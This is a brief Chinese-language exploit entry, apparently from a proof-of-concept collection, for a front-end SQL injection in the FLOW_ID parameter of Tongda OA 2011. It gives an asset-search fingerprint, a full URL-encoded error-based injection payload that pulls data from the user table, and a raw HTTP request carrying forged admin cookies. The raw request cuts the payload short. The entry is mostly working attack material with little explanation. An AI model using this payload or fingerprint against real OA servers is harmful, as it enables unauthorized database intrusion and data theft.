# 通达OAFLOW_ID存在前台SQL注入漏洞

- **系统**：通达OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`GET /general/score/flow/scoredate/result.php?FLOW_ID=11%bf%27%20and%20%28SELECT%201%20from%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28select%20md5%281122%29%20from%20user%20limit%201%29,1,62%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%23 H`
- **关键头**：`Host: {hostname}`　`Cookie: PHPSESSID=5c69ce55fd8e8aba091b846170af39d0; USER_NAME_COOKIE=admin; OA_USER_ID=a…`

**请求体 / payload**
```
GET /general/score/flow/scoredate/result.php?FLOW_ID=11%bf%27%20 HTTP/1.1
Host: {hostname}
Cookie: PHPSESSID=5c69ce55fd8e8aba091b846170af39d0; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=3bf14bb4; UI_COOKIE=0
```

**其他**
- 通达OA FLOW\_ID存在前台SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA2011